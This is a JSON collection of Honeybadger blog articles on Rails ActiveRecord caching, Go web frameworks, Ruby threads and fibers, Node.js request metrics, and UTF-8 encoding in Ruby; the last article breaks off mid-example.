[
{"website": "Honey-Badger", "title": "How ActiveRecord Uses Caching To Avoid Unnecessary Trips To The Database", "author": ["Jonathan Miles"], "link": "https://www.honeybadger.io/blog/rails-activerecord-caching/", "abstract": "A general way to describe caching is storing the result of some code so that we can quickly retrieve it later. In some cases, this means storing a computed value to avoid needing to recompute it later. However, we can also cache data by simply keeping it in memory, without performing any computations, to avoid having to read from a hard drive or perform a network request. This latter form is particularly relevant for ActiveRecord, where the database often runs on a separate server. Thus, all requests incur network-traffic overhead, not to mention the load placed on the database server when the query is performed again. Fortunately, for Rails developers, ActiveRecord itself already handles a lot of this for us, perhaps without us even being conscious of it. This is nice for productivity, but sometimes, it's important to know what is being cached behind-the-scenes. For example, when you know (or expect) a value is being changed by another process, or you absolutely must have the most up-to-date value. In cases like these, ActiveRecord provides a couple of 'escape hatches' to force an uncached read of the data. ActiveRecord's Lazy Evaluation ActiveRecord's lazy evaluation is not caching per se, but we will be encountering it in code examples later on, so we'll provide a brief overview. When you construct an ActiveRecord query, in many cases, the code does not issue an immediate call to the database. This is what allows us to chain multiple .where clauses without having to hit the database each time: @posts = Post . where ( published: true ) # no DB hit yet @posts = @posts . where ( publied_at: Date . today ) # still nothing @posts . count # SELECT COUNT(*) FROM \"posts\" WHERE... There are some exceptions to this. For example, when using .find , .find_by , .pluck , .to_a , or .first , it is impossible to chain additional clauses. In most of the examples below, I will be using .to_a as a simple way to force a DB call. Note that if you are experimenting with this in a Rails console, you will need to turn off 'echo' mode. Otherwise, the console (either irb or pry) calls .inspect on the object once you hit 'enter', which forces a DB query.\nTo disable echo mode, you can use the following code: conf . echo = false # for irb pry_instance . config . print = proc {} # for pry ActiveRecord Relations The first part of ActiveRecord's built-in caching we'll look at is relations. For example, we have a typical User-Posts relationship: # app/models/user.rb class User < ApplicationRecord has_many :posts end # app/models/post.rb class Post < ApplicationRecord belongs_to :user end This gives us the handy user.posts and post.user methods to perform a database query to find the related record(s). Let's say we're using these in a controller and view: # app/controllers/posts_controller.rb class PostsController < ApplicationController def index @user = User . find ( params [ :user_id ]) @posts = @user . posts end ... # app/views/posts/index.html.erb ... < %= render 'shared/sidebar' %>\n<% @posts.each do |post| %>\n  <%= render post %>\n<% end %> # app/views/shared/_sidebar.html.erb ... < % @posts.each do | post | %>\n  <li> < %= post.title %></li>\n<% end %> We have a basic index action that grabs @user.posts . Similar to the previous section, the database query has not been run at this point. Rails then renders our index view, which, in turn, renders the sidebar. The sidebar calls @posts.each ... , and at this point, ActiveRecord fires off the database query to get the data. We then return to the rest of our index template, where we have another @posts.each ; however, this time, there is no database call. What's happening is that ActiveRecord is caching all these posts for us and does not bother trying to read from the database again. Escape Hatch There are times when we may want to force ActiveRecord to fetch the associated records again; perhaps, we know it is being changed by another process (a background job, for example). Another common situation is in automated tests where we want to get the latest value in the database to validate that the code has updated it correctly. There are two common ways to do this, depending on the situation. I think the most common way is simply to call .reload on the association, which tells ActiveRecord that we want to ignore whatever it has cached and get the latest version from the database: @user = User . find ( 1 ) @user . posts # DB Call @user . posts # Cached, no DB call @user . posts . reload # DB call @user . posts # Cached new version, no DB call Another option is to simply get a new instance of the ActiveRecord model (e.g., by calling find again): @user = User . find ( 1 ) @user . posts # DB Call @user . posts # Cached, no DB call @user = User . find ( 1 ) # @user is now a new instance of User @user . posts # DB Call, no cache in this instance Caching relationships is good, but we often end up with complicated .where(...) queries beyond simple relationship lookups. This is where ActiveRecord's SQL cache comes in. ActiveRecord's SQL Cache ActiveRecord keeps an internal cache of queries it has performed to speed up performance. Note, however, that this cache is tied to the particular action; it is created at the start of the action and destroyed at the end of the action. This means you will only see this if you a performing the same query twice within one controller action. It also means the cache is not used in the Rails console. Cache hits are shown in the Rails log with a CACHE . For example, class PostsController < ApplicationController def index ... Post . all . to_a # to_a to force DB query ... Post . all . to_a # to_a to force DB query produces the following log output: Post Load ( 2.1 ms ) SELECT \"posts\" . * FROM \"posts\" ↳ app / controllers / posts_controller . rb : 11 :in `index'\n  CACHE Post Load (0.0ms)  SELECT \"posts\".* FROM \"posts\"\n  ↳ app/controllers/posts_controller.rb:13:in ` index ' You can actually take a peek at what's inside the cache for an action by printing out ActiveRecord::Base.connection.query_cache (or ActiveRecord::Base.connection.query_cache.keys for just the SQL query). Escape Hatch There are probably not many reasons you would need to bypass the SQL Cache, but nevertheless, you can force ActiveRecord to bypass its SQL cache by using the uncached method on ActiveRecord::Base : class PostsController < ApplicationController def index ... Post . all . to_a # to_a to force DB query ... ActiveRecord :: Base . uncached do Post . all . to_a # to_a to force DB query end As it's a method on ActiveRecord::Base , you could also call it via one of your model classes if it improves readability; for example, Post . uncached do Post . all . to_a end Counter Cache It's pretty common in web applications to want to count the records in a relationship (e.g., a user has X posts or a team account has Y users). Due to how common it is, ActiveRecord includes a way to automatically keep a counter up-to-date so that you don't have a bunch of .count calls using up database resources. It only takes a couple of steps to enable it. First, we add counter_cache to the relationship so that ActiveRecord knows to cache the count for us: class Post < ApplicationRecord belongs_to :user , counter_cache: true end We also need to add a new column to User , where the count will be stored. In our example, this will be User.posts_count . You can pass a symbol to counter_cache to specify the column name if needed. rails generate migration AddPostsCountToUsers posts_count:integer\nrails db:migrate The counters will now be set to 0 (the default). If your application already has some posts, you'll need to update them. ActiveRecord provides a reset_counters method to handle the nitty-gritty details, so you just need to pass it IDs and tell it which counter to update: User . all . each do | user | User . reset_counters ( user . id , :posts ) end Finally, we have to check the places where this count is being used. This is because calling .count will bypass the counter and will always run a COUNT() SQL query. Instead, we can use .size , which knows to use the counter cache if it exists. As an aside, you may want to default to using .size everywhere, as it also doesn't reload associations if they are already present, potentially saving a trip to the database. Conclusion For the most part, ActiveRecord's internal caching \"just works\". I can't say I've seen many cases that need to bypass it, but as with all things, knowing what goes on \"under-the-hood\" can save you some time and agony when you stumble into a situation that requires something out of the ordinary. Of course, the database is not the only place where Rails is doing some behind-the-scenes caching for us. The HTTP specification includes headers that can be sent between the client and server to avoid having to re-send data that hasn't changed. In the next article in this series on caching, we'll take a look at the 304 (Not Modified) HTTP status code, how Rails handles it for you, and how you can tweak this handling.", "date": "2021-01-20"},
{"website": "Honey-Badger", "title": "Go write a web app! Five interesting Go web frameworks", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/go-write-a-web-app-five-interesting-go-web-frameworks/", "abstract": "Go is such a new language that even more established frameworks can have interesting quirks. One of the key issues learning the Go framework is the availability of useful documentation. Unfortunately, Go framework maintainers don’t always prioritize writing the documentation necessary to get new programmers up to speed on their frameworks. The five frameworks below, however, have usable documentation and are straightforward to use. 1. Martini Getting started with Martini is painless (which may explain why it's one of the most popular Go frameworks). The framework was designed to be simple and work with other Go packages—or, as the maintainers describe it, a \"classy\" web framework. If you’re just getting started with Go, Martini may be the best framework to use for your projects. Out of the box, Martini has the features you’ll need on most early projects. It’s also modular, which means adding functionality is easy. Keep in mind that Martini isn't idiomatic Go, though; it's not wrong, but you may face some trouble switching back and forth. # Martini looks a little like Sinatra m . Get ( \"/\" , func () string { return \"hello world\" // HTTP 200 : \"hello world\" }) 2. Gorilla Technically speaking, Gorilla is a web toolkit, rather than a web framework. However, packages within Gorilla will make your projects easier to launch. Gorilla Mux, for example, is an especially powerful URL router and dispatcher. Gorilla also has packages for saving sessions, authenticating and encrypting cookies and websockets. In addition to the documentation on the Gorilla site, there's a strong community able to provide some support. You can also easily use Gorilla in conjunction with other frameworks. # Mux isn ' t a web framework , but it has tools for routing , sessions # and other things you need to make a web app . r := mux . NewRouter () r . HandleFunc ( \"/\" , HomeHandler ) r . HandleFunc ( \"/products\" , ProductsHandler ) r . HandleFunc ( \"/articles\" , ArticlesHandler ) http . Handle ( \"/\" , r ) 3. Echo If you’ve used Echo in the past, you may not be a big fan—the maintainers rebased the whole code base recently. Annoying as that may be, the framework has a lot to offer, especially if you’re coming to Echo fresh. Echo’s performance is impressive and handles garbage collection efficiently. If speed is a concern on your project, Echo is your best option. You may find a few points in the Echo documentation listed as a \"work in progress,\" but Echo’s maintainers have posted numerous recipes to get programmers going. # Echo also looks kind of like Sinatra . I ' m sensing a pattern . blog := echo . New () blog . Use ( mw . Logger ()) blog . Use ( mw . Recover ()) hosts [ \"blog.localhost:1323\" ] = blog blog . Get ( \"/\" , func ( c * echo . Context ) error { return c . String ( http . StatusOK , \"Blog\" ) }) 4. web.go web.go claims to be \"the simplest way to write web applications in Go.\" Whether or not that’s accurate, web.go is one of the easiest web frameworks for writing backend web services. If you’ve worked with a higher-level web framework like web.py or Sinatra, you can get up to speed with web.go almost immediately. While web.go’s quickstart guide may be enough for more experienced programmers, the framework’s tutorial and API docs are thorough. func hello ( val string ) string { return \"hello \" + val } func main () { web . Get ( \"/(.*)\" , hello ) web . Run ( \"0.0.0.0:9999\" ) } 5. Beego Looking for a framework that guarantees high performance? Beego is worth trying out. The framework is designed for full-stack web development and it's modular. There’s also the bee tool within Beego as a bonus. The Bee tool auto-compiles, reloads, tests and deploys Beego applications efficiently. Beego has a huge amount of documentation and demos, though some are difficult to understand the first time through—set aside a little extra time for the documentation. You can also see a number of web applications using Beego in production. If you’re looking for a more specialized web framework, check out Awesome Go ’s in-depth list of actively maintained frameworks and other tools. Open source contributors are launching new Go projects every day, so make sure you stay up to date—you may even find a Go library you can contribute to yourself.", "date": "2015-07-16"},
{"website": "Honey-Badger", "title": "Opening The Ruby Concurrency Toolbox", "author": ["Alex Braha Stoll"], "link": "https://www.honeybadger.io/blog/ruby-concurrency-parallelism/", "abstract": "Concurrency and parallelism are more important than ever for Ruby developers. They can make our applications faster, utilizing the hardware that powers them to its fullest potential. In this article, we are going to explore the tools currently available to every Rubyist and also what Ruby promises to soon deliver in this department. Not everyone uses concurrency directly, but we all use it indirectly via tools like Sidekiq. Understanding Ruby concurrency won't just help you build your own solutions; it will help you understand and troubleshoot existing ones. But first let's take a step back and look at the big picture. Concurrency vs. Parallelism These terms are used loosely, but they do have distinct meanings. Concurrency: The art of doing many tasks, one at a time. By switching between them quickly, it may appear to the user as though they happen simultaneously. Parallelism: Doing many tasks at literally the same time. Instead of appearing simultaneous, they are simultaneous. Concurrency is most often used for applications that are IO heavy. For example, a web app may regularly interact with a database or make lots of network requests. By using concurrency, we can keep our application responsive, even while we wait for the database to respond to our query. This is possible because the Ruby VM allows other threads to run while one is waiting during IO. Even if a program has to make dozens of requests, if we use concurrency, the requests will be made at virtually the same time. Parallelism, on the other hand, is not currently supported by Ruby. Why No Parallelism in Ruby? Today, there is no way of achieving parallelism within a single Ruby process using the default Ruby implementation (generally called MRI or CRuby). The Ruby VM enforces a lock (the GVM, or Global VM Lock) that prevents multiple threads from running Ruby code at the same time. This lock exists to protect the internal state of the virtual machine and to prevent scenarios that could result in the VM crashing. This is not a great spot to be in, but all hope is not lost: Ruby 3 is coming soon and it promises to solve this handicap by introducing a concept codenamed Guild (explained in the last sections of this article). Threads Threads are Ruby's concurrency workhorse. To better understand how to use them and what pitfalls to be aware of, we're going to give an example. We'll build a little program that consumes an API and stores its results in a datastore using concurrency. Before we build the API client, we need an API. Below is the implementation of a tiny API that accepts a number and responds as plain text if the number provided is even odd. If the syntax looks strange to you, don't worry. This doesn't have anything to do with concurrency. It's just a tool we'll use. app = Proc . new do | env | sleep 0.05 qs = env [ 'QUERY_STRING' ] number = Integer ( qs . match ( /number=(\\d+)/ )[ 1 ]) [ '200' , { 'Content-Type' => 'text/plain' }, [ number . even? ? 'even' : 'odd' ] ] end run app To run this web app you'll need to have the rack gem installed, then execute rackup config.ru . We also need a mock datastore. Here's a class that simulates a key-value database: class Datastore # ... accessors and initialization omitted ... def read ( key ) data [ key ] end def write ( key , value ) data [ key ] = value end end Now, let's go through the implementation of our concurrent solution. We have a method, run , which concurrently fetches 1,000 records and stores them in our datastore. class ThreadPoweredIntegration # ... accessors and initialization ... def run threads = [] ( 1 .. 1000 ). each_slice ( 250 ) do | subset | threads << Thread . new do subset . each do | number | uri = 'http://localhost:9292/' \\ \"even_or_odd?number= #{ number } \" status , body = AdHocHTTP . new ( uri ). blocking_get handle_response ( status , body ) rescue Errno :: ETIMEDOUT retry # Try again if the server times out. end end end threads . each ( & :join ) end # ... end We create four threads, each processing 250 records. We use this strategy in order not to overwhelm the third-party API or our own systems. By having the requests being made concurrently using multiple threads, the total execution will take a fraction of the time that a sequential implementation would take. While each thread has moments of inactivity during all the steps necessary to establish and communicate through an HTTP request, the Ruby VM allows a different thread to start running. This is the reason why this implementation is much faster than a sequential one. The AdHocHTTP class is a straightforward HTTP client implemented specially for this article to allow us to focus only on the differences between code powered by threads and code powered by fibers. It's beyond the scope of this article to discuss its implementation, but you can check it out here if you're curious. Finally, we handle the server's response by the end of the inner loop. Here's how the method handle_response looks: # ... inside the ThreadPoweredIntegration class ... attr_reader :ds def initialize @ds = Datastore . new ( even: 0 , odd: 0 ) end # ... def handle_response ( status , body ) return if status != '200' key = body . to_sym curr_count = ds . read ( key ) ds . write ( key , curr_count + 1 ) end This method looks all right, doesn't it? Let's run it and see what ends up at our datastore: { even: 497 , odd: 489 } This is pretty strange, as I'm sure that between 1 and 1000 there are 500 even numbers and 500 odd ones. In the next section, let's understand what's happening and briefly explore one of the ways to solve this bug. Threads and Data Races: The Devil Is in the Details Using threads allows our IO heavy programs to run much faster, but they're also tough to get right. The error in our results above is caused by a race condition in the handle_response method. A race condition happens when two threads manipulate the same data. Since we're operating on a shared resource (the ds datastore object), we have to be especially careful with non-atomic operations. Notice that we first read from the datastore and--in a second statement--we write to it the count incremented by 1. This is problematic because our thread may stop running after the read but before the write. Then, if another thread runs and increments the value of the key we're interested in, we'll write an out-of-date count when the original thread resumes. One way to mitigate the dangers of using threads is to use higher-level abstractions to structure a concurrent implementation. Check out the concurrent-ruby gem for different patterns to use and a safer thread-powered program. There are many ways to fix a data race. A simple solution is to use a mutex. This synchronization mechanism enforces one-at-a-time access to a given segment of code. Here's our previous implementation fixed by the usage of a mutex: # ... inside ThreadPoweredIntegration class ... def initialize # ... @semaphore = Mutex . new end # ... def handle_response ( status , body ) return if status != '200' key = body . to_sym semaphore . synchronize do curr_count = ds . read ( key ) ds . write ( key , curr_count + 1 ) end end If you plan to use threads inside a Rails application, the official guide Threading and Code Execution in Rails is a must-read. Failing to follow these guidelines may result in very unpleasant consequences, like leaking database connections. After running our corrected implementation, we get the expected result: { even: 500 , odd: 500 } Instead of using a mutex, we can also get rid of data races by dropping threads altogether and reaching for another concurrency tool available in Ruby. In the next section, we're going to take a look at Fiber as a mechanism for improving the performance of IO-heavy apps. Fiber: A Slender Tool for Concurrency Ruby Fibers let you achieve cooperative concurrency within a single thread. This means that fibers are not preempted and the program itself must do the scheduling. Because the programmer controls when fibers start and stop, it is much easier to avoid race conditions. Unlike threads, fibers do not grant us better performance when IO happens.  Fortunately, Ruby provides asynchronous reads and writes through its IO class. By using these async methods we can prevent IO operations from blocking our fiber-based code. Same Scenario, Now with Fibers Let's go through the same example, but now using fibers combined with the async capabilities of Ruby's IO class. It's beyond the scope of this article to explain all the details of async IO in Ruby. Still, we'll touch on the essential parts of its workings and you can take a look at the implementation of the relevant methods of AdHocHTTP (the same client appearing in the threaded solution we've just explored) if you're curious. We'll start by looking at the run method of our fiber-powered implementation: class FiberPoweredIntegration # ... accessors and initialization ... def run ( 1 .. 1000 ). each_slice ( 250 ) do | subset | Fiber . new do subset . each do | number | uri = 'http://127.0.0.1:9292/' \\ \"even_or_odd?number= #{ number } \" client = AdHocHTTP . new ( uri ) socket = client . init_non_blocking_get yield_if_waiting ( client , socket , :connect_non_blocking_get ) yield_if_waiting ( client , socket , :write_non_blocking_get ) status , body = yield_if_waiting ( client , socket , :read_non_blocking_get ) handle_response ( status , body ) ensure client & . close_non_blocking_get end end . resume end wait_all_requests end # ... end We first create a fiber for each subset of the numbers we want to check if even or odd. Then we loop over the numbers, calling yield_if_waiting . This method is responsible for stopping the current fiber and allowing another one to resume. Notice also that after creating a fiber, we call resume . This causes the fiber to start running.  By calling resume immediately after creation, we start making HTTP requests even before the main loop going from 1 to 1000 finishes. At the end of the run method, there's a call to wait_all_requests . This method selects fibers that are ready to run and also guarantees we make all the intended requests. We'll take a look at it in the last segment of this section. Now, let's see yield_if_waiting in detail: # ... inside FiberPoweredIntegration ... def initialize @ds = Datastore . new ( even: 0 , odd: 0 ) @waiting = { wait_readable: {}, wait_writable: {} } end # ... def yield_if_waiting ( client , socket , operation ) res_or_status = client . send ( operation ) is_waiting = [ :wait_readable , :wait_writable ]. include? ( res_or_status ) return res_or_status unless is_waiting waiting [ res_or_status ][ socket ] = Fiber . current Fiber . yield waiting [ res_or_status ]. delete ( socket ) yield_if_waiting ( client , socket , operation ) rescue Errno :: ETIMEDOUT retry # Try again if the server times out. end We first try to perform an operation (connect, read, or write) using our client. Two primary outcomes are possible: Success: When that happens, we return. We can receive a symbol: This means we have to wait. How does one \"wait\"? We create a kind of checkpoint by adding our socket combined with the current fiber to the instance variable waiting (which is a Hash ). We store this pair inside a collection that holds IO waiting for reading or writing (we'll see why that's important in a moment), depending on the result we get back from the client. We stop the execution of the current fiber, allowing another one to run. The paused fiber will get the opportunity to resume work at some point after the associated network socket becomes ready. Then, the IO operation will be retried (and this time will succeed). Every Ruby program runs inside a fiber that itself is part of a thread (everything inside a process). As a consequence, when we create a first fiber, run it, and then at some point yield, we're resuming the execution of the central part of the program. Now that we understand the mechanism used to yield execution when a fiber is waiting IO, let's explore the last bit needed to comprehend this fiber-powered implementation. def wait_all_requests while ( waiting [ :wait_readable ]. any? || waiting [ :wait_writable ]. any? ) ready_to_read , ready_to_write = IO . select ( waiting [ :wait_readable ]. keys , waiting [ :wait_writable ]. keys ) ready_to_read . each do | socket | waiting [ :wait_readable ][ socket ]. resume end ready_to_write . each do | socket | waiting [ :wait_writable ][ socket ]. resume end end end The chief idea here is to wait (in other words, to loop) until all pending IO operations are complete. To do that, we use IO.select . It accepts two collections of pending IO objects: one for reading and one for writing. It returns those IO objects that have finished their job. Because we associated these IO objects with the fibers responsible for running them, it's simple to resume those fibers. We keep on repeating these steps until all requests are fired and completed. The Grand Finale: Comparable Performance, No Need for Locks Our handle_response method is exactly the same as that initially used in the code using threads (the version without a mutex). However, since all our fibers run inside the same thread, we won't have any data races. When we run our code, we get the expected result: { even: 500 , odd: 500 } You probably don't want to deal with all that fiber switching business every time you leverage async IO. Fortunately, some gems abstract all this work and make the usage of fibers something the developer doesn't need to think about. Check out the async project as a great start. Fibers Shine When High Scalability Is a Must Although we can reap the benefits of virtually eliminating the risks of data races even in small scale scenarios, fibers are a great tool when high scalability is needed. Fibers are much more lightweight than threads. Given the same available resources, creating threads will overwhelm a system much sooner than fibers. For an excellent exploration on the topic, we recommend the presentation The Journey to One Million by Ruby Core Team's Samuel Williams. Guild - Parallel Programming in Ruby So far we've seen two useful tools for concurrency in Ruby. Neither of them, however, can improve the performance of pure computations. For that you would need true parallelism, which doesn't currently exist in Ruby (here we're considering MRI, the default implementation). This may be changing in Ruby 3 with the coming of a new feature called \"Guilds.\"  Details are still hazy, but in the following sections we'll take a look at how this work-in-progress feature promises to allow parallelism in Ruby. How Guilds Might Work A significant source of pain when implementing concurrent/parallel solutions is shared memory. In the section on threads, we already saw how easy it is to make a slip and write code that may seem innocuous at first glance but actually contains subtle bugs. Koichi Sasada--the Ruby Core Team member heading the development of the new Guild feature--is hard at work designing a solution that tackles head on the dangers of sharing memory among multiple threads. In his presentation at the 2018 RubyConf, he explains that when using guilds one won't be able to simply share mutable objects. The main idea is to prevent data races by only allowing immutable objects to be shared between different guilds. Specialized data structures will be introduced in Ruby to allow some measure of shared memory between guilds, but the details of how exactly this is going to work are still not fully fleshed out. There will also be an API that will allow objects to be copied or moved between guilds, plus a safeguard to impede an object from being referenced after it's been moved to a different guild. Using Guilds to Explore a Common Scenario There are many situations where you might wish you could speed up computations by running them in parallel. Let's imagine that we have to calculate the average and mean of the same dataset. The example below shows how we might do this with guilds. Keep in mind that this code doesn't currently work and might never work, even after guilds are released. # A frozen array of numeric values is an immutable object. dataset = [ 88 , 43 , 37 , 85 , 84 , 38 , 13 , 84 , 17 , 87 ]. freeze # The overhead of using guilds will probably be # considerable, so it will only make sense to # parallelize work when a dataset is large / when # performing lots of operations. g1 = Guild . new do mean = dataset . reduce (: + ). fdiv ( dataset . length ) Guild . send_to ( :mean , Guild . parent ) end g2 = Guild . new do median = Median . calculate ( dataset . sort ) Guild . send_to ( :median , Guild . parent ) end results = {} # Every Ruby program will be run inside a main guild; # therefore, we can also receive messages in the main # section of our program. Guild . receive ( :mean , :median ) do | tag , result | results [ tag ] = result end Summing It Up Concurrency and parallelism are not the main strengths of Ruby, but even in this department the language does offer tools that are probably good enough to deal with most use cases. Ruby 3 is coming and it seems things will get considerably better with the introduction of the Guild primitive. In my opinion, Ruby is still a very suitable choice in many situations, and its community is clearly hard at work making the language even better. Let's keep an ear to the ground for what's coming!", "date": "2020-02-11"},
{"website": "Honey-Badger", "title": "Request Metrics for Node.js", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/node-js-metrics/", "abstract": "Today we're apathetically announcing that we now support monitoring request metrics for web apps written in Node.js. This change may give some Node customers (whatever) deeper insight into their web applica... SORRY (sry), I can't do this. We try to live up to our name and not care at Honeybadger, but the truth is that we DO care. Not only do we care, but we're unbelievably stoked to announce that we're bringing our performance monitoring tools to Node. This week we released version v1.1 of our honeybadger npm package . This release is the next step forward for our Node.js monitoring suite, on the heels of version v1.0 which really stepped up our Node game . In v1.0 we brought new tools for monitoring popular Node.js frameworks and platforms such as middlware for Connect and Express , built-in support for monitoring AWS Lambda , and more. With v1.1, we've added a new middleware for Connect/Express apps called Honeybadger.metricsHandler() . A simple express app might look like this: var express = require ( ' express ' ); var Honeybadger = require ( ' honeybadger ' ); var app = express (); app . use ( Honeybadger . metricsHandler ); app . use ( Honeybadger . requestHandler ); app . all ( ' /fail ' , function ( req , res ) { throw ( new Error ( ' This was thrown in an Express app. ' )); }); app . listen ( 3000 , function () { console . log ( ' Example app listening on port 3000! ' ); }); app . use ( Honeybadger . errorHandler ); Notice that we're using the new metricsHandler middlware before the normal requestHandler (which ensures asynchonous errors are reported) and the errorHandler middleware (which actually reports the errors). For Connect or Express, that's the only change required to see your request metrics in Honeybadger: For other frameworks, we've added a Honeybadger.timing() method which can be used to send us request metrics manually: var startAt = process . hrtime (); // Process request here. // Calculate the time difference in milliseconds. var diff = process . hrtime ( startAt ); var time = diff [ 0 ] * 1 e3 + diff [ 1 ] * 1 e - 6 ; åç Honeybadger . timing ( \" app.request.200 \" , time ) The format for request metrics is app.request.STATUS_CODE , where status code is the integer status code of the response (i.e. 200 , 301 , 500 , etc.). Still pretty easy, right? So that's it. In the coming months we'll be working to make performance monitoring for Node even better. In the meantime, we hope that monitoring your request metrics will help you keep your Node.js apps performing at their best. Let me know what you think! Feedback is welcome! Have a comment, question, suggestion, or bug report? Email me , submit an issue , or send a pull request . Need a Honeybadger account? Start your free trial and monitor your Node app today!", "date": "2016-05-17"},
{"website": "Honey-Badger", "title": "A Rubyist's Introduction to Character Encoding, Unicode and UTF-8", "author": ["José M. Gilgado"], "link": "https://www.honeybadger.io/blog/the-rubyist-guide-to-unicode-utf8/", "abstract": "It's very likely that you've seen a Ruby exception like UndefinedConversionError or IncompatibleCharacterEncodings . It's less likely that you've understood what the exception means. This article will help. You'll learn how character encodings work and how they're implemented in Ruby. By the end, you'll be able to understand and fix these errors much more easily. So what is a \"character encoding\" anyway? In every programming language, you work with strings. Sometimes you process them as input, sometimes you display them as output. But your computer doesn't understand \"strings.\" It only understands bits: 1s and 0s. The process for transforming strings to bits is called character encoding. But character encoding doesn't only belong to the era of computers. We can learn from a simpler process before we had computers: Morse code. Morse code Morse code is very simple in its definition. You have two symbols or ways to produce a signal (short and long). With those two symbols, you represent a simple English alphabet. For example: A is .- (one short mark and one long mark) E is . (one short mark) O is --- (three long marks) This system was invented around 1837 and it allowed, with only two symbols or signals, the whole alphabet to be encoded. You can play with one translator online here . In the image you can see an \"encoder,\" a person responsible for encoding and decoding messages. This will soon change with the arrival of computers. From manual to automatic encoding To encode a message, you need a person to manually translate the characters into symbols following the algorithm of Morse code. Similar to Morse code, computers use only two \"symbols\": 1 and 0. You can only store a sequence of these in the computer, and when they are read, they need to be interpreted in a way that makes sense to the user. The process works like this in both cases: Message -> Encoding -> Store/Send -> Decoding -> Message SOS in Morse code it would be: SOS -> Encode('SOS') -> ...---... -> Decode('...---...') -> SOS\n-----------------------              --------------------------\n       Sender                                 Receiver A big change with computers and other technology was that the process of encoding and decoding was automatized so we no longer needed people to translate the information. When computers were invented, one of the early standards created to transform characters into 1s and 0s automatically (though not the first) was ASCII. ASCII stands for American Standard Code for Information Interchange. The \"American\" part played an important role in how computers worked with information for some time; we'll see why in the next section. ASCII (1963) Based on knowledge of telegraphic codes like Morse code and very early computers, a standard for encoding and decoding characters in a computer was created around 1963. This system was relatively simple since it only covered 127 characters at first, the English alphabet plus extra symbols. ASCII worked by associating each character with a decimal number that could be translated into binary code. Let's see an example: \"A\" is 65 in ASCII, so we need to translate 65 into binary code. If you don't know how that works, here's a quick way : We start dividing 65 by 2 and continue until we get 0. If the division is not exact, we add 1 as a remainder: 65 / 2 = 32 + 1\n32 / 2 = 16 + 0\n16 / 2 = 8 + 0\n8 / 2  = 4 + 0\n4 / 2  = 2 + 0\n2 / 2  = 1 + 0\n1 / 2  = 0 + 1 Now, we take the remainders and put them in inverse order: 1000001 So we'd store \"A\" as \"1000001\" with the original ASCII encoding, now known as US-ASCII. Nowadays, with 8-bit computers commonplace, it'd be 01000001 (8 bits = 1 byte). We follow the same process for each character, so with 7 bits, we can store up to 2^7 characters = 127. Here's the full table: (From http://www.plcdev.com/ascii_chart) The problem with ASCII What would happen if we wanted to add another character, like the French ç or the Japanese character 大? Yes, we'd have a problem. After ASCII, people tried to solve this problem by creating their own encoding systems. They used more bits, but this eventually caused another problem. The main issue was that when reading a file, you didn't know if you had a certain encoding system. Attempting to interpret it with an incorrect encoding resulted in jibberish like \"���\" or \"Ã,ÂÃƒâ€šÃ‚Â\". The evolution of those encoding systems was big and wide. Depending on the language, you had different systems. Languages with more characters, like Chinese, had to develop more complex systems to encode their alphabets. After many years struggling with this, a new standard was created: Unicode. This standard defined the way modern computers encode and decode information. Unicode (1988) Unicode's goal is very simple. According to its official site: \n\"To provide a unique number for every character, no matter the platform, program, or language.\" So each character in a language has a unique code assigned, also known as a code point. There are currently more than 137,000 characters. As part of the Unicode standard, we have different ways to encode those values or code points, but UTF-8 is the most extensive. The same people that created the Go programming language, Rob Pike and Ken Thompson, also created UTF-8. It has succeeded because it's efficient and clever in how it encodes those numbers. Let's see why exactly. UTF-8: Unicode Transformation Format (1993) UTF-8 is now the de facto encoding for websites (more than 94% of websites use that encoding). It's also the default encoding for many programming languages and files. So why was it so successful and how does it work? UTF-8, like other encoding systems, transforms the numbers defined in Unicode to binary to store them in the computer. There are two very important aspects of UTF-8: \n- It's efficient when storing bits, since a character can take from 1 to 4 bytes.\n- By using Unicode and a dynamic amount of bytes, it's compatible with the ASCII encoding because the first 127 characters take 1 byte. This means you can open an ASCII file as UTF-8. Let's break down how UTF-8 works. UTF-8 with 1 byte Depending on the value in the Unicode table, UTF-8 uses a different number of characters. With the first 127, it uses the following template: Rust1\n0_______ So the 0 will always be there, followed by the binary number representing the value in Unicode (which will also be ASCII). For example: A = 65 = 1000001. Let's check this with Ruby by using the unpack method in String : 'A' . unpack ( 'B*' ). first # 01000001 The B means that we want the binary format with the most significant bit first. In this context, that means the bit with highest value.\nThe asterisk tells Ruby to continue until there are no more bits. If we used a number instead, we'd only get the bits up to that number: 'A' . unpack ( 'B4' ). first # 01000 UTF-8 with 2 bytes If we have a character whose value or code point in Unicode is beyond 127, up to 2047, we use two bytes with the following template: 110_____ 10______ So we have 11 empty bits for the value in Unicode. Let's see an example: À is 192 in Unicode, so in binary it is 11000000, taking 8 bits. It doesn't fit in the first template, so we use the second one: 110_____ 10______ We start filling the spaces from right to left: 110___11 10000000 What happens with the empty bits there? We just put 0s, so the final result is: 11000011 10000000. We can begin to see a pattern here. If we start reading from left to right, the first group of 8 bits has two 1s at the beginning. This implies that the character is going to take 2 bytes: 11000011 10000000\n-- Again, we can check this with Ruby: 'À' . unpack ( 'B*' ). first # 1100001110000000 A little tip here is that we can better format the output with: 'À' . unpack ( 'B8 B8' ). join ( ' ' ) # 11000011 10000000 We get an array from 'À'.unpack('B8 B8') and then we join the elements with a space to get a string. The 8s in the unpack parameter tells Ruby to get 8 bits in 2 groups. UTF-8 with 3 bytes If the value in Unicode for a character doesn't fit in the 11 bits available in the previous template, we need an extra byte: 1110____  10______  10______ Again, the three 1s at the beginning of the template tell us that we're about to read a 3-byte character. The same process would be applied to this template; transform the Unicode value into binary and start filling the slots from right to left. If we have some empty spaces after that, fill them with 0s. UTF-8 with 4 bytes Some values take even more than the 11 empty bits we had in the previous template. Let's see an example with the emoji 🙂, which for Unicode can also be seen as a character like \"a\" or \"大\". \"🙂\"'s value or code point in Unicode is 128578. That number in binary is: 11111011001000010, 17 bits. This means it doesn't fit in the 3-byte template since we only had 16 empty slots, so we need to use a new template that takes 4 bytes in memory: 11110___  10______ 10______  10______ We start again by filling it with the number in binary: Rust1\n11110___  10_11111 10011001  10000010 And now, we fill the rest with 0s: Rust1\n1111000  10011111 10011001  10000010 Let's see how this looks in Ruby. Since we already know that this will take 4 bytes, we can optimize for better readability in the output: '🙂' . unpack ( 'B8 B8 B8 B8' ). join ( ' ' ) # 11110000 10011111 10011001 10000010 But if we didn't, we could just use: '🙂' . unpack ( 'B*' ) We could also use the \"bytes\" string method for extracting the bytes into an array: \"🙂\" . bytes # [240, 159, 153, 130] And then, we could map the elements into binary with: 